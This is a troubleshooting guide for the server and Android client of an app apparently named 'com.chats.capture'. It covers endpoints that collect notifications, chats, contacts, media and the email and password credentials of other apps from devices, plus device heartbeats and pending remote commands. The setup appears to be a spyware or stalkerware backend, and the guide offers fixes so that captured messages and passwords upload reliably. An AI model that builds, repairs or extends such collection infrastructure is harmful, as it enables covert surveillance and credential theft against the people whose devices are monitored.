# Fix API Issues - Comprehensive Guide

## Common API Issues & Fixes

### 1. **GET /api/notifications** - Returns 401 Unauthorized

**Problem:** Endpoint requires authentication but app is not sending auth token

**Fix:** Check if endpoint should allow unauthenticated access for device polling

**Solution:**
```javascript
// In server/routes/notifications.js
// Change from:
router.get('/', authenticate, async (req, res) => {

// To (if devices need to poll):
router.get('/', optionalAuth, async (req, res) => {
```

**Or:** Ensure app sends auth token in requests

---

### 2. **POST /api/notifications** - Returns 400 Bad Request

**Problem:** Missing required fields or validation error

**Check Required Fields:**
- `id` (required)
- `appPackage` (required)
- `appName` (required)
- `title` or `text` (at least one)

**Fix:** Ensure app sends all required fields:
```kotlin
val notification = NotificationData(
    id = generateId(),
    deviceId = deviceId,
    appPackage = packageName,
    appName = appName,
    title = title,
    text = text,
    timestamp = System.currentTimeMillis()
)
```

---

### 3. **POST /api/chats** - Returns 400 Bad Request

**Problem:** Missing required fields

**Check Required Fields:**
- `id` (required)
- `appPackage` (required)
- `appName` (required)
- `text` (required)

**Fix:** Ensure app sends all required fields:
```kotlin
val chat = ChatData(
    id = generateId(),
    deviceId = deviceId,
    appPackage = packageName,
    appName = appName,
    text = messageText,
    timestamp = System.currentTimeMillis()
)
```

---

### 4. **POST /api/contacts** - Returns 400 Bad Request

**Problem:** Missing `name` field

**Fix:** Ensure `name` is always provided:
```kotlin
val contact = Contact(
    deviceId = deviceId,
    name = contactName, // REQUIRED
    phoneNumber = phone,
    email = email,
    timestamp = System.currentTimeMillis()
)
```

---

### 5. **POST /api/credentials** - Returns 400 Bad Request

**Problem:** Missing `password` field

**Fix:** Ensure password is always provided:
```kotlin
val credential = Credential(
    deviceId = deviceId,
    accountType = CredentialType.APP_PASSWORD,
    appPackage = packageName,
    email = email,
    password = password, // REQUIRED
    timestamp = System.currentTimeMillis()
)
```

---

### 6. **GET /api/media** - Returns 404 Not Found

**Problem:** Route might not exist or path is wrong

**Check:** Verify route exists in `server/routes/media.js`:
```javascript
router.get('/', authenticate, async (req, res) => {
    // ... implementation
});
```

**Fix:** If missing, add GET route:
```javascript
router.get('/', authenticate, async (req, res) => {
    try {
        const { deviceId, limit = 100 } = req.query;
        const db = getDb();
        const filter = deviceId ? { deviceId } : {};
        
        const mediaFiles = await db.collection('media_files')
            .find(filter)
            .sort({ timestamp: -1 })
            .limit(parseInt(limit))
            .toArray();
        
        res.json({
            success: true,
            mediaFiles: mediaFiles,
            count: mediaFiles.length
        });
    } catch (error) {
        console.error('Error fetching media files:', error);
        res.status(500).json({
            success: false,
            message: 'Error fetching media files'
        });
    }
});
```

---

### 7. **Connection Refused / Timeout**

**Problem:** Server is not accessible or URL is wrong

**Fixes:**

1. **Check Server URL:**
   ```bash
   # Test server connectivity
   curl -v $SERVER_URL/health
   ```

2. **Verify Server is Running:**
   ```bash
   # Check server logs
   cd server
   npm start
   ```

3. **Check Firewall/Network:**
   - Ensure server port is open
   - Check if behind proxy (Render, Heroku, etc.)
   - Verify CORS settings

4. **Update App Server URL:**
   ```bash
   # Open app settings
   adb shell am start -n com.chats.capture/.ui.MainActivity
   # Go to Settings → Server URL
   # Update to correct URL
   ```

---

### 8. **Rate Limiting (429 Too Many Requests)**

**Problem:** Too many requests in short time

**Fix:** Implement exponential backoff in app:
```kotlin
// In ApiClient.kt
@Retry(maxAttempts = 3, delay = 1000L)
suspend fun uploadNotification(notification: NotificationData) {
    // ... retry logic
}
```

**Or:** Increase rate limit in server:
```javascript
// In server.js
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 1000, // Increase from 100
});
```

---

### 9. **CORS Errors**

**Problem:** Cross-Origin Resource Sharing blocked

**Fix:** Ensure CORS is configured:
```javascript
// In server.js
app.use(cors({
    origin: '*', // Or specific origins
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));
```

---

### 10. **MongoDB Connection Errors**

**Problem:** Database not connected

**Fix:**
```bash
# Check MongoDB connection
cd server
node -e "require('./database/mongodb').connect().then(() => console.log('Connected')).catch(e => console.error(e))"
```

**Or:** Verify MongoDB URI:
```bash
echo $MONGODB_URI
# Should be: mongodb://localhost:27017 or your MongoDB Atlas URI
```

---

## API Endpoint Checklist

### ✅ Working Endpoints (No Auth Required)
- [ ] POST /api/devices/register
- [ ] POST /api/notifications
- [ ] POST /api/notifications/batch
- [ ] POST /api/chats
- [ ] POST /api/chats/batch
- [ ] POST /api/contacts
- [ ] POST /api/contacts/batch
- [ ] POST /api/credentials
- [ ] POST /api/credentials/batch
- [ ] POST /api/devices/:deviceId/heartbeat
- [ ] GET /api/devices/:deviceId/commands/pending
- [ ] GET /health

### ✅ Working Endpoints (Auth Required)
- [ ] GET /api/notifications
- [ ] GET /api/chats
- [ ] GET /api/contacts
- [ ] GET /api/credentials
- [ ] GET /api/media
- [ ] GET /api/devices
- [ ] GET /api/devices/:deviceId

---

## Testing & Verification

### 1. Test Individual Endpoints
```bash
# Test device registration
curl -X POST $SERVER_URL/api/devices/register \
  -H "Content-Type: application/json" \
  -d '{"deviceId":"test-device","deviceName":"Test"}'

# Test notification upload
curl -X POST $SERVER_URL/api/notifications \
  -H "Content-Type: application/json" \
  -d '{"id":"test-1","deviceId":"test-device","appPackage":"com.test","appName":"Test","title":"Test","text":"Test"}'
```

### 2. Check Server Logs
```bash
cd server
npm start
# Watch for errors in console
```

### 3. Check MongoDB
```bash
# Connect to MongoDB
mongo $MONGODB_URI/$DB_NAME

# Check collections
db.notifications.countDocuments()
db.chats.countDocuments()
db.contacts.countDocuments()
```

### 4. Monitor App Logcat
```bash
# Watch API requests
adb logcat -s API_CLIENT:D API_REQUEST_DATA:D API_RESPONSE_DATA:D

# Watch sync activity
adb logcat -s SYNC_WORKER:D
```

---

## Quick Fixes Script

Create `quick-fix-apis.sh`:
```bash
#!/bin/bash

echo "🔧 Quick API Fixes"
echo ""

# 1. Check server health
echo "1. Checking server health..."
curl -s $SERVER_URL/health || echo "❌ Server not responding"

# 2. Test device registration
echo ""
echo "2. Testing device registration..."
curl -s -X POST $SERVER_URL/api/devices/register \
  -H "Content-Type: application/json" \
  -d '{"deviceId":"test-fix","deviceName":"Test Fix"}' | jq .

# 3. Check MongoDB connection
echo ""
echo "3. Checking MongoDB..."
cd server
node -e "require('./database/mongodb').connect().then(() => console.log('✅ MongoDB OK')).catch(e => console.error('❌ MongoDB Error:', e.message))"

echo ""
echo "✅ Quick fixes complete"
```

---

## Summary

**Most Common Issues:**
1. Missing required fields → Check API documentation for required fields
2. Authentication errors → Add auth token or use `optionalAuth`
3. Server not accessible → Check URL and connectivity
4. Rate limiting → Implement backoff or increase limits
5. CORS errors → Configure CORS properly

**Quick Diagnostic:**
```bash
# Run comprehensive test
./fetch-and-test-apis.sh

# Check specific endpoint
curl -v $SERVER_URL/api/notifications

# Check server logs
cd server && npm start
```

For detailed API documentation, see: `server/routes/*.js`
